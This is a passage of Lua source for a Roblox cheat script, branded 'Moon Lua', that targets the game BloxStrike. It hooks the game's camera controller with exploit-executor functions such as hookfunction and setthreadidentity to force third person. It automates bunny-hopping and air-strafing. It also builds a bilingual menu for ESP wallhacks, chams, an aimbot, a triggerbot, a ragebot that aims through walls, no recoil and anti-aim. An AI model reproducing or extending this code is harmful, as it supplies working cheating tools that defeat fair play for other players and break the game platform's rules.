							local function fn56(arg, ...)
								if arg == true and bloxStrikeCameraPerspectiveHook.CanForce() and not bloxStrikeCameraPerspectiveHook.IsMenuTakingOver() then
									local v16, v17 = bloxStrikeCameraPerspectiveHook.GetSettings()
									local ok4, result4 = pcall(v15, false, false, v17)

									if not ok4 then
										local ok5, result5 = pcall(v15, false, false)

										if not ok5 then
											error(result4, 0)
											result4 = result5
										else
											result4 = result5
										end
									end

									bloxStrikeCameraPerspectiveHook.SetDistance(v17)
									return result4
								end

								if flag2 and bloxStrikeCameraPerspectiveHook.IsMenuTakingOver() then
									local canForce2 = bloxStrikeCameraPerspectiveHook.CanForce

									bloxStrikeCameraPerspectiveHook.CanForce = function()
										return false
									end

									local ok4, result4 = pcall(v15, arg, ...)
									bloxStrikeCameraPerspectiveHook.CanForce = canForce2

									if not ok4 then
										error(result4, 0)
									end

									return result4
								end

								return v15(arg, ...)
							end

							v15 = hookfunction
							v15 = v15(cameraController.setPerspective, fn55(fn56))
							bloxStrikeCameraPerspectiveHook.Original = v15
							fn53(bloxStrikeCameraPerspectiveHook)
						end

						local function fn55(arg)
							if canForce() and arg then
								local v15
								v15, v15 = getSettings()
								setDistance(v15)

								pcall(function()
									localPlayer2.CameraMode = Enum.CameraMode.Classic
								end)

								local cameraController = tbl5.CameraController

								if cameraController and type(cameraController.setMouseEnabled) == "function" then
									pcall(cameraController.setMouseEnabled, false)
								end

								fn52()
								fn51(arg)
							else
								fn47()
							end
						end

						local function fn56(arg, arg2, arg3)
							local flag2 = v12 == arg and n == (arg and arg2 or 0) and v13 == arg3 and localPlayer2.CameraMode == (arg and Enum.CameraMode.Classic or Enum.CameraMode.LockFirstPerson)
							if not flag2 or not arg then
								return flag2
							end
							return math.abs(localPlayer2.CameraMinZoomDistance - arg2) <= 0.01 and math.abs(localPlayer2.CameraMaxZoomDistance - arg2) <= 0.01
						end

						local function fn57(arg, arg2, arg3)
							if not arg2 then
								return pcall(arg.setPerspective, true, false)
							end
							local ok4, result4 = pcall(arg.setPerspective, false, false, arg3)
							if ok4 then
								return ok4, result4
							end
							return pcall(arg.setPerspective, false, false)
						end

						local function fn58(arg)
							if flag then
								return
							end
							flag = true

							local ok4, result4 = pcall(function()
								local cameraController = tbl5.CameraController
								local currentCamera = tbl4.Workspace.CurrentCamera
								if not cameraController or type(cameraController.setPerspective) ~= "function" or not currentCamera then
									fn55(nil)
									return
								end
								local v15, v16 = getSettings()

								if v15 and not canForce() then
									v12 = nil
									n = nil
									v13 = nil
									fn55(currentCamera)
									return
								end

								if not arg and fn56(v15, v16, currentCamera) then
									fn55(currentCamera)
									return
								end

								if fn57(cameraController, v15, v16) then
									if v15 then
										setDistance(v16)

										pcall(function()
											localPlayer2.CameraMode = Enum.CameraMode.Classic
										end)
									end

									v12 = v15
									n = v15 and v16 or 0
									v13 = currentCamera
								end

								fn55(currentCamera)
							end)

							flag = false

							if not ok4 then
								error(result4, 0)
							end
						end

						local function fn59()
							local bloxStrikeCameraStateGuard = genv.BloxStrikeCameraStateGuard

							if bloxStrikeCameraStateGuard and bloxStrikeCameraStateGuard.Version == 1 then
								bloxStrikeCameraStateGuard.ShouldForce = canForce

								bloxStrikeCameraStateGuard.Apply = function()
									if bloxStrikeCameraStateGuard.Applying then
										return
									end
									bloxStrikeCameraStateGuard.Applying = true
									pcall(fn58, false)
									bloxStrikeCameraStateGuard.Applying = false
								end

								return
							end

							local bloxStrikeCameraStateGuard2

							bloxStrikeCameraStateGuard2 = {
								Version = 1,
								Applying = false,
								ShouldForce = canForce,
								Apply = function()
									if bloxStrikeCameraStateGuard2.Applying then
										return
									end
									bloxStrikeCameraStateGuard2.Applying = true
									pcall(fn58, false)
									bloxStrikeCameraStateGuard2.Applying = false
								end,
							}

							genv.BloxStrikeCameraStateGuard = bloxStrikeCameraStateGuard2

							local function fn60()
								local ok4, result4 = pcall(bloxStrikeCameraStateGuard2.ShouldForce)

								if ok4 and result4 then
									bloxStrikeCameraStateGuard2.Apply()
								end
							end

							for _, v15 in ipairs({ "CameraMode", "CameraMinZoomDistance", "CameraMaxZoomDistance" }) do
								localPlayer2:GetPropertyChangedSignal(v15):Connect(fn60)
							end

							tbl4.Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(fn60)
						end

						fn54()
						fn59()

						return {
							Apply = function()
								fn58(true)
							end,
							Update = function()
								fn58(false)
							end,
							FinalUpdate = function()
								fn58(false)
							end,
						}
					end

					local v12 = fn41()

					local function fn42()
						local connection = nil

						local function fn43()
							return tbl5.InputController.isActionActive("Jump")
						end

						local function fn44()
							if connection then
								connection:Disconnect()
								connection = nil
							end

							local v13 = fn20()
							if not v13 or v13.IsDestroyed then
								return
							end
							v13:SetJumpInput(false)
						end

						local function fn45()
							fn44()

							connection = tbl4.RunService.Heartbeat:Connect(function()
								if not tbl2.Running or not tbl5.CharacterController then
									return
								end
								local v13 = fn20()
								if not v13 then
									return
								end

								if v13.IsDestroyed or not v13.OnGround then
									v13:SetJumpInput(false)
									return
								end

								if fn43() then
									v13:SetJumpInput(true)
								end
							end)

							fn17(connection)
						end

						local function fn46(arg)
							if not tbl5.InputController or type(tbl5.InputController.isActionActive) ~= "function" then
								return false
							end
							local ok4, result4 = pcall(tbl5.InputController.isActionActive, arg)
							return ok4 and result4 == true
						end

						local function fn47()
							return Vector3.new((fn46("Move Right (Strafe)") and 1 or 0) - (fn46("Move Left (Strafe)") and 1 or 0), 0, (fn46("Move Forward") and 1 or 0) - (fn46("Move Backward") and 1 or 0))
						end

						local function fn48()
							local currentCamera = tbl4.Workspace.CurrentCamera
							if not currentCamera then
								return nil, nil
							end
							local n = currentCamera.CFrame.LookVector * Vector3.new(1, 0, 1)
							local vector

							if n.Magnitude < 0.01 then
								vector = Vector3.new(0, 0, -1)
							else
								vector = n.Unit
							end

							return vector, Vector3.new(-vector.Z, 0, vector.X)
						end

						local function fn49(arg, arg2)
							local vector = Vector3.new(arg.X, 0, arg.Z)
							if vector.Magnitude <= 1 then
								return arg2
							end
							local v13, v14 = fn48()
							if not v13 or not v14 then
								return arg2
							end
							local dot = v13.Dot
							local vector2 = Vector2.new(v14:Dot(vector), dot(v13, vector))
							if vector2.Magnitude < 0.01 then
								return arg2
							end
							local vector22 = Vector2.new(-vector2.Y, vector2.X)
							local vector23 = Vector2.new(vector2.Y, -vector2.X)
							local dot2 = v13.Dot
							local vector24 = Vector2.new(v14:Dot(arg2), dot2(v13, arg2))

							if vector24.Magnitude > 0.01 then
								local unit = vector24.Unit
								if vector22:Dot(unit) < vector23:Dot(unit) then
									return v14 * vector23.X + v13 * vector23.Y
								end
							end

							return v14 * vector22.X + v13 * vector22.Y
						end

						local function fn50()
							if not tbl2.Running or not fn9("BloxStrike Auto Direction") then
								return
							end
							local v13 = fn20()
							if not v13 or v13.IsDestroyed or not v13.Character then
								return
							end

							if not fn25(localPlayer2, v13.Character) or v13.OnGround ~= false then
								return
							end
							local movementState = type(v13.MovementState) == "table" and v13.MovementState or nil

							if movementState then
								movementState = movementState.MovementMode or movementState.Mode
							end

							if v13.IsClimbing == true or movementState == "Ladder" or movementState == "Climbing" then
								return
							end

							if type(v13.MoveFunction) ~= "function" then
								return
							end
							local v14 = fn47()
							if v14.Magnitude <= 0.01 then
								return
							end
							local v15, v16 = fn48()
							if not v15 or not v16 then
								return
							end
							local globalVelocity = v13.GlobalVelocity

							if typeof(globalVelocity) ~= "Vector3" then
								globalVelocity = Vector3.zero
							end

							local n = v16 * v14.X + v15 * v14.Z
							if n.Magnitude <= 0.01 then
								return
							end
							local unit = n.Unit
							local v17 = fn49(globalVelocity, unit)

							if v17.Magnitude <= 0.01 or v17:Dot(unit) < 0 then
								v17 = unit
							end

							local n2 = unit * 0.5 + v17 * 0.5

							if not (n2.Magnitude <= 0.01) then
								unit = n2.Unit
							end

							pcall(v13.MoveFunction, v13, unit, false)
						end

						local flag

						local function fn51()
							if flag then
								tbl4.RunService:UnbindFromRenderStep("BloxStrike.AutoDirection")
								flag = nil
							end
						end

						return {
							StartBhop = fn45,
							StopBhop = fn44,
							StartAutoDirection = function()
								fn51()
								tbl4.RunService:BindToRenderStep("BloxStrike.AutoDirection", Enum.RenderPriority.Input.Value + 2, fn50)
								flag = true
							end,
							StopAutoDirection = fn51,
							Update = function()
							end,
						}
					end

					local v13 = fn42()

					local v14 = lib:CreateWindow({
						name = "BloxStrike",
						subtitle = "Moon Lua",
						sidebarLayout = true,
						locale = "en",
						configuration = {
							autoSave = true,
							autoLoad = true,
							fileName = "BloxStrike",
							customFolder = "Moon Lua",
						},
						translations = {
							["zh-cn"] = {
								BloxStrike = "BloxStrike",
								["Moon Lua"] = "Moon Lua",
								Visuals = "视觉",
								Legit = "合法",
								["Player ESP"] = "玩家透视",
								["World ESP"] = "世界透视",
								["Text Color"] = "文字颜色",
								Model = "模型",
								Chams = "透视模型",
								["Chams Outline"] = "透视模型描边",
								["Chams Fill"] = "透视模型填充",
								["Chams Outline Color"] = "透视模型描边颜色",
								["Chams Fill Color"] = "透视模型填充颜色",
								Color = "颜色",
								Highlight = "高亮",
								Name = "名称",
								Distance = "距离",
								Enabled = "已开启",
								Disabled = "已关闭",
								None = "无",
								Weapon = "武器",
								Grenade = "投掷物",
								C4 = "C4",
								Status = "状态",
								Site = "地点",
								Time = "时间",
								Held = "手持",
								Thrown = "已投掷",
								["Max Distance"] = "最大距离",
								["ESP Text Size"] = "ESP 字体大小",
								["Icon Size"] = "图标大小",
								["Dropped Items"] = "掉落物品",
								["Grenade Trajectory"] = "投掷物轨迹",
								["C4 ESP"] = "C4 透视",
								["Dropped Highlight"] = "掉落物高亮",
								["Item Max Distance"] = "物品最大距离",
								["Held Trajectory"] = "手持轨迹",
								["Trajectory Color"] = "轨迹颜色",
								["Thrown Trajectory"] = "投掷轨迹",
								["Bullet Tracer"] = "子弹轨迹",
								["Local Tracer Color"] = "自己子弹轨迹颜色",
								["Team Tracer Color"] = "队友子弹轨迹颜色",
								["Enemy Tracer Color"] = "敌人子弹轨迹颜色",
								["Bullet Impacts"] = "子弹命中点",
								["Bullet Impacts Color"] = "子弹命中点颜色",
								["Hit Mark"] = "命中标记",
								["Hit Mark Lifetime"] = "命中标记持续时间",
								["Hit Mark Scale"] = "命中标记大小",
								["Tracer Texture"] = "轨迹纹理",
								["Tracer Lifetime"] = "轨迹持续时间",
								Obelus = "Obelus",
								Lightning = "闪电",
								DNA = "DNA",
								["Planted C4"] = "已安放 C4",
								Rage = "暴怒",
								Ragebot = "暴力自瞄",
								["Aim Through Walls"] = "穿墙瞄准",
								["Multi Tap"] = "暴力连射",
								["Multi Tap Delay"] = "暴力连射延迟",
								["Anti Aim"] = "反自瞄",
								Pitch = "俯仰",
								Yaw = "偏航",
								None = "无",
								Backwards = "向后",
								Randomise = "随机",
								Rotate = "旋转",
								["Custom Pitch"] = "自定义俯仰",
								["Custom Yaw"] = "自定义偏航",
								["Pitch Speed"] = "俯仰速度",
								["Yaw Speed"] = "偏航速度",
								Jitter = "抖动",
								["Sway Style"] = "摆动样式",
								["Sway Angle"] = "摆动角度",
								["Sway Min"] = "摆动最小值",
								["Sway Max"] = "摆动最大值",
								Speed = "速度",
								Sway = "摆动",
								Linear = "线性",
								Sine = "正弦",
								Quad = "二次",
								Cubic = "三次",
								Quart = "四次",
								Quint = "五次",
								Exponential = "指数",
								Circular = "圆形",
								Back = "回弹",
								Bounce = "弹跳",
								Elastic = "弹性",
								Aimbot = "自瞄",
								["Aimbot Keybind"] = "自瞄快捷键",
								Activation = "激活方式",
								["Priority Hitbox"] = "优先命中部位",
								["On Attack"] = "攻击时",
								["On Scope"] = "开镜时",
								Both = "攻击或开镜",
								Always = "始终",
								Closest = "最近",
								Conditions = "条件",
								["Through Smokes"] = "穿透烟雾",
								["Ignore Flash"] = "忽略闪光",
								Hitboxes = "命中部位",
								Body = "身体",
								Arm = "手臂",
								Leg = "腿部",
								FOV = "视野范围",
								Head = "头部",
								Smoothing = "平滑度",
								["Reaction Time"] = "反应时间",
								["Target Switch Delay"] = "目标切换延迟",
								["No Recoil"] = "无后坐力",
								["Spread Scale"] = "散布倍率",
								["Spread Scale: 100% = vanilla, 0% = no spread"] = "散布倍率：100% = 原版，0% = 无散布",
								TriggerBot = "扳机机器人",
								["TriggerBot Keybind"] = "扳机机器人快捷键",
								["Hit Chance"] = "命中率",
								["Min Damage"] = "最低伤害",
								["Burst Time"] = "连发时间",
								Movement = "移动",
								Ground = "地面",
								["Bunny Hop"] = "连跳",
								Air = "空中",
								["Air Strafe"] = "空中转向",
								["Hit Sound"] = "命中音效",
								["Sound Style"] = "音效样式",
								["Sound ID"] = "音效 ID",
								Default = "默认",
								Custom = "自定义",
								Settings = "设置",
								Camera = "相机",
								["Third Person"] = "第三人称",
								["Third Person Distance"] = "第三人称距离",
								Language = "语言",
								["Choose interface language"] = "选择界面语言",
								English = "English",
								["Simplified Chinese"] = "简体中文",
							},
						},
					})

					flags = v14.Flags

					task.defer(function()
						local flag = type(getthreadidentity) == "function" and type(setthreadidentity) == "function"
						local result4 = nil

						if flag then
							local ok4
							ok4, result4 = pcall(getthreadidentity)
							local v15 = nil

							if not ok4 then
								result4 = v15
							end
						end

						pcall(fn31)

						if result4 ~= nil then
							pcall(setthreadidentity, result4)
						end
					end)

					local function fn43(arg, arg2, arg3)
						v14:Notify({ title = arg or "", content = arg2 or "", duration = arg3 or 5 })
					end

					local function fn44(arg, arg2)
						fn43(fn7(arg, arg), fn7(arg2 and "Enabled" or "Disabled", arg2 and "Enabled" or "Disabled"), 3)
					end

					local v15 = v14:CreateTab({ name = "Visuals", icon = "eye" })
					v15:CreateSection({ name = "Player ESP" })

					v15:CreateDropdown({
						name = "Player ESP",
						flag = "BloxStrike Player ESP Elements",
						multiSelect = true,
						options = {
							"Name",
							"Distance",
							"Model",
							"Weapon",
							"Grenade",
							"C4",
							"Health",
							"HealthBar",
						},
						value = {
							"Name",
							"Distance",
							"Model",
							"Weapon",
							"Grenade",
							"C4",
							"Health",
							"HealthBar",
						},
					})

					v15:CreateColorPicker({
						name = "Text Color",
						flag = "BloxStrike ESP Text Color",
						color = fn13("BloxStrike ESP Text Color", Color3.new(1, 1, 1)),
					})

					v15:CreateColorPicker({
						name = "Chams Outline Color",
						flag = "BloxStrike ESP Chams Outline Color",
						color = Color3.fromRGB(255, 255, 255),
					})

					v15:CreateColorPicker({
						name = "Chams Fill Color",
						flag = "BloxStrike ESP Chams Fill Color",
						color = Color3.fromRGB(128, 128, 255),
					})

					v15:CreateSlider({
						name = "ESP Text Size",
						flag = "BloxStrike ESP Text Size",
						range = { 8, 30 },
						increment = 1,
						value = 14,
						suffix = " px",
					})

					v15:CreateSlider({
						name = "Icon Size",
						flag = "BloxStrike ESP Icon Size",
						range = { 50, 200 },
						increment = 1,
						value = 100,
						suffix = "%",
					})

					v15:CreateSlider({
						name = "Max Distance",
						flag = "BloxStrike Player ESP Distance",
						range = { 100, 5000 },
						increment = 1,
						value = 3000,
						suffix = " studs",
					})

					v15:CreateSection({ name = "World ESP" })

					v15:CreateDropdown({
						name = "Dropped Items",
						flag = "BloxStrike Dropped ESP Elements",
						multiSelect = true,
						options = { "Name", "Distance", "Highlight" },
						value = {},
					})

					v15:CreateColorPicker({
						name = "Color",
						flag = "BloxStrike Dropped ESP Color",
						color = Color3.fromRGB(255, 220, 80),
					})

					v15:CreateSlider({
						name = "Item Max Distance",
						flag = "BloxStrike Dropped ESP Distance",
						range = { 100, 3000 },
						increment = 1,
						value = 1500,
						suffix = " studs",
					})

					v15:CreateDropdown({
						name = "Grenade Trajectory",
						flag = "BloxStrike Grenade Trajectory Elements",
						multiSelect = true,
						options = { "Held", "Thrown" },
						value = {},
					})

					v15:CreateColorPicker({
						name = "Trajectory Color",
						flag = "BloxStrike Trajectory Color",
						color = Color3.fromRGB(100, 255, 140),
					})

					v15:CreateToggle({ name = "Bullet Tracer", flag = "BloxStrike Bullet Tracer", value = false })

					v15:CreateColorPicker({
						name = "Local Tracer Color",
						flag = "BloxStrike Bullet Tracer Local Color",
						color = Color3.fromRGB(100, 95, 245),
					})

					v15:CreateColorPicker({
						name = "Team Tracer Color",
						flag = "BloxStrike Bullet Tracer Team Color",
						color = Color3.fromRGB(255, 200, 150),
					})

					v15:CreateColorPicker({
						name = "Enemy Tracer Color",
						flag = "BloxStrike Bullet Tracer Enemy Color",
						color = Color3.fromRGB(255, 50, 80),
					})

					v15:CreateDropdown({
						name = "Tracer Texture",
						flag = "BloxStrike Bullet Tracer Texture",
						options = { "Obelus", "Lightning", "DNA" },
						value = "Obelus",
					})

					v15:CreateSlider({
						name = "Tracer Lifetime",
						flag = "BloxStrike Bullet Tracer Lifetime",
						range = { 0.5, 10 },
						increment = 0.1,
						value = 2,
						suffix = " s",
					})

					v15:CreateToggle({ name = "Bullet Impacts", flag = "BloxStrike Bullet Impacts", value = false })

					v15:CreateColorPicker({
						name = "Bullet Impacts Color",
						flag = "BloxStrike Bullet Impacts Color",
						color = Color3.fromRGB(100, 95, 245),
					})

					v15:CreateToggle({ name = "Hit Mark", flag = "BloxStrike Hit Mark", value = true })

					v15:CreateSlider({
						name = "Hit Mark Lifetime",
						flag = "BloxStrike Hit Mark Lifetime",
						range = { 0.1, 10 },
						increment = 0.1,
						value = 3,
						suffix = " s",
					})

					v15:CreateSlider({
						name = "Hit Mark Scale",
						flag = "BloxStrike Hit Mark Scale",
						range = { 25, 300 },
						increment = 1,
						value = 100,
						suffix = "%",
					})

					v15:CreateSection({ name = "Hit Sound" })
					v15:CreateToggle({ name = "Hit Sound", flag = "BloxStrike Hit Sound", value = true })

					v15:CreateDropdown({
						name = "Sound Style",
						flag = "BloxStrike Hit Sound Style",
						options = { "Default", "Custom" },
						value = "Default",
					})

					v15:CreateInput({
						name = "Sound ID",
						placeholder = "Sound ID",
						value = "6607204501",
						flag = "BloxStrike Hit Sound ID",
					})

					v15:CreateDropdown({
						name = "C4 ESP",
						flag = "BloxStrike C4 ESP Elements",
						multiSelect = true,
						options = { "Status", "Site", "Time", "Distance" },
						value = { "Status", "Site", "Time", "Distance" },
					})

					local v16 = v14:CreateTab({ name = "Legit", icon = "crosshair" })
					v16:CreateSection({ name = "Aimbot" })
					local v17 = v16:CreateToggle({ name = "Aimbot", flag = "BloxStrike Aimbot" })

					v16:CreateKeybind({
						name = "Aimbot Keybind",
						currentKeybind = "None",
						holdToInteract = false,
						flag = "BloxStrike Aimbot Keybind",
						callback = function()
							v17:Set(not fn9("BloxStrike Aimbot"))
							fn44("Aimbot", fn9("BloxStrike Aimbot"))
						end,
					})

					v16:CreateDropdown({
						name = "Activation",
						flag = "BloxStrike Legit Aimbot Activation",
						options = { "On Attack", "On Scope", "Both", "Always" },
						value = "On Attack",
					})

					v16:CreateDropdown({
						name = "Conditions",
						flag = "BloxStrike Legit Aimbot Conditions",
						multiSelect = true,
						options = { "Through Smokes", "Ignore Flash" },
						value = {},
					})

					v16:CreateDropdown({
						name = "Priority Hitbox",
						flag = "BloxStrike Legit Aimbot Priority Hitbox",
						options = { "Head", "Body", "Closest" },
						value = "Head",
					})

					v16:CreateDropdown({
						name = "Hitboxes",
						flag = "BloxStrike Legit Aimbot Hitboxes",
						multiSelect = true,
						options = { "Head", "Body", "Arm", "Leg" },
						value = { "Head" },
					})

					v16:CreateSlider({
						name = "FOV",
						flag = "BloxStrike Legit Aimbot FOV",
						range = { 1, 360 },
						increment = 1,
						value = 100,
						suffix = "u",
					})

					v16:CreateSlider({
						name = "Smoothing",
						flag = "BloxStrike Legit Aimbot Smoothing",
						range = { 0, 100 },
						increment = 1,
						value = 50,
						suffix = "%",
					})

					v16:CreateSlider({
						name = "Reaction Time",
						flag = "BloxStrike Legit Aimbot Reaction Time",
						range = { 0, 1000 },
						increment = 1,
						value = 200,
						suffix = "ms",
					})

					v16:CreateSlider({
						name = "Target Switch Delay",
						flag = "BloxStrike Legit Aimbot Target Switch Delay",
						range = { 0, 1000 },
						increment = 1,
						value = 200,
						suffix = "ms",
					})

					v16:CreateSection({ name = "TriggerBot" })
					local v18 = v16:CreateToggle({ name = "TriggerBot", flag = "BloxStrike TriggerBot" })

					v16:CreateKeybind({
						name = "TriggerBot Keybind",
						currentKeybind = "None",
						holdToInteract = false,
						flag = "BloxStrike TriggerBot Keybind",
						callback = function()
							v18:Set(not fn9("BloxStrike TriggerBot"))
							fn44("TriggerBot", fn9("BloxStrike TriggerBot"))
						end,
					})

					v16:CreateDropdown({
						name = "Conditions",
						flag = "BloxStrike Legit TriggerBot Conditions",
						multiSelect = true,
						options = { "Through Smokes", "Ignore Flash" },
						value = {},
					})

					v16:CreateDropdown({
						name = "Hitboxes",
						flag = "BloxStrike Legit TriggerBot Hitboxes",
						multiSelect = true,
						options = { "Head", "Body", "Arm", "Leg" },
						value = { "Head" },
					})

					v16:CreateSlider({
						name = "Hit Chance",
						flag = "BloxStrike Legit TriggerBot Hit Chance",
						range = { 0, 100 },
						increment = 1,
						value = 100,
						suffix = "%",
					})

					v16:CreateSlider({
						name = "Min Damage",
						flag = "BloxStrike Legit TriggerBot Min Damage",
						range = { 1, 100 },
						increment = 1,
						value = 1,
					})

					v16:CreateSlider({
						name = "Reaction Time",
						flag = "BloxStrike Legit TriggerBot Reaction Time",
						range = { 0, 1000 },
						increment = 1,
						value = 0,
						suffix = "ms",
					})

					v16:CreateSlider({
						name = "Burst Time",
						flag = "BloxStrike Legit TriggerBot Burst Time",
						range = { 0, 1000 },
						increment = 1,
						value = 50,
						suffix = "ms",
					})

					local v19 = v14:CreateTab({ name = "Rage", icon = "crosshair" })
					v19:CreateSection({ name = "Weapon" })
					v19:CreateToggle({ name = "No Recoil", flag = "BloxStrike No Recoil" })

					v19:CreateSlider({
						name = "Spread Scale",
						flag = "BloxStrike Spread Scale",
						range = { 0, 100 },
						increment = 1,
						value = 100,
						suffix = "%",
					})

					v19:CreateSection({ name = "Ragebot" })
					v19:CreateToggle({ name = "Enabled", flag = "BloxStrike Ragebot Enabled" })
					v19:CreateToggle({ name = "Aim Through Walls", flag = "BloxStrike Ragebot Aim Through Walls" })
					v19:CreateToggle({ name = "Multi Tap", flag = "BloxStrike Ragebot Multi Tap" })

					v19:CreateSlider({
						name = "Multi Tap Delay",
						flag = "BloxStrike Ragebot Multi Tap Delay",
						range = { 1, 100 },
						increment = 1,
						value = 50,
						suffix = "ms",
					})

					v19:CreateSection({ name = "Anti Aim" })
					v19:CreateToggle({ name = "Anti Aim", flag = "BloxStrike Anti Aim" })

					v19:CreateDropdown({
						name = "Pitch",
						flag = "BloxStrike Anti Aim Pitch",
						options = { "None", "Randomise", "Rotate", "Custom" },
						value = "None",
					})

					v19:CreateSlider({
						name = "Custom Pitch",
						flag = "BloxStrike Anti Aim Custom Pitch",
						range = { -1, 1 },
						increment = 0.01,
						value = 0,
					})

					v19:CreateSlider({
						name = "Pitch Speed",
						flag = "BloxStrike Anti Aim Pitch Speed",
						range = { 1, 50 },
						increment = 1,
						value = 10,
					})

					v19:CreateDropdown({
						name = "Yaw",
						flag = "BloxStrike Anti Aim Yaw",
						options = { "None", "Backwards", "Randomise", "Rotate", "Sway", "Custom" },
						value = "None",
					})

					v19:CreateSlider({
						name = "Custom Yaw",
						flag = "BloxStrike Anti Aim Custom Yaw",
						range = { -180, 180 },
						increment = 1,
						value = 0,
						suffix = "°",
					})

					v19:CreateSlider({
						name = "Yaw Speed",
						flag = "BloxStrike Anti Aim Yaw Speed",
						range = { 1, 50 },
						increment = 1,
						value = 10,
					})

					v19:CreateSlider({
						name = "Jitter",
						flag = "BloxStrike Anti Aim Jitter",
						range = { 0, 360 },
						increment = 1,
						value = 0,
						suffix = "°",
					})

					v19:CreateDropdown({
						name = "Sway Style",
						flag = "BloxStrike Anti Aim Sway Style",
						options = {
							"Linear",
							"Sine",
							"Quad",
							"Cubic",
							"Quart",
							"Quint",
							"Exponential",
							"Circular",
							"Back",
							"Bounce",
							"Elastic",
						},
						value = "Quad",
					})

					v19:CreateSlider({
						name = "Sway Angle",
						flag = "BloxStrike Anti Aim Sway Angle",
						range = { -180, 180 },
						increment = 1,
						value = 0,
						suffix = "°",
					})

					v19:CreateSlider({
						name = "Sway Min",
						flag = "BloxStrike Anti Aim Sway Min",
						range = { -180, 180 },
						increment = 1,
						value = -180,
						suffix = "°",
					})

					v19:CreateSlider({
						name = "Sway Max",
						flag = "BloxStrike Anti Aim Sway Max",
						range = { -180, 180 },
						increment = 1,
						value = 180,
						suffix = "°",
					})

					local v20 = v14:CreateTab({ name = "Movement", icon = "move" })
					v20:CreateSection({ name = "Ground" })

					v20:CreateToggle({
						name = "Bunny Hop",
						flag = "BloxStrike Bhop",
						callback = function(arg)
							if arg then
								v13.StartBhop()
							else
								v13.StopBhop()
							end
						end,
					})

					v20:CreateSection({ name = "Air" })

					v20:CreateToggle({
						name = "Air Strafe",
						flag = "BloxStrike Auto Direction",
						value = false,
						callback = function(arg)
							if arg then
								v13.StartAutoDirection()
							else
								v13.StopAutoDirection()
							end
						end,
					})

					local v21 = v14:CreateTab({ name = "Settings", icon = "settings" })
					v21:CreateSection({ name = "Camera" })

					v21:CreateToggle({
						name = "Third Person",
						flag = "BloxStrike Third Person",
						value = false,
						callback = function()
							v12.Apply()
						end,
					})

					v21:CreateSlider({
						name = "Third Person Distance",
						flag = "BloxStrike Third Person Distance",
						range = { 5, 100 },
						increment = 1,
						value = 10,
						suffix = " studs",
						callback = function()
							v12.Apply()
						end,
					})

					v21:CreateSection({ name = "Language" })

					v21:CreateDropdown({
						name = "Choose interface language",
						options = { "English", "Simplified Chinese" },
						value = "English",
						flag = "BloxStrike Interface Language",
						callback = function(arg)
							str2 = arg == "English" and "en" or "zh-cn"
							v14:SetLocale(str2)
						end,
					})

					fn19("BloxStrike.Camera", Enum.RenderPriority.Camera.Value + 2, function()
						if tbl2.Running then
							v12.Update()
						end
					end)

					fn19("BloxStrike.CameraFinal", Enum.RenderPriority.Last.Value + 100, function()
						if tbl2.Running then
							v12.FinalUpdate()
						end
					end)

					fn19("BloxStrike.Visuals", Enum.RenderPriority.Camera.Value + 3, function()
						if tbl2.Running then
							v10.Update()
						end
					end)

					fn19("BloxStrike.Combat", Enum.RenderPriority.Camera.Value + 4, function(arg)
						if tbl2.Running then
							v11.Update(arg)
						end
					end)

					fn19("BloxStrike.Movement", Enum.RenderPriority.Input.Value + 2, function()
						if tbl2.Running then
							v13.Update()
						end
					end)

					return
				end

				while true do
					wait()
				end
			else
				fn2("Login Failed2", result3)

				while true do
					wait()
				end
			end
		end
	end
end
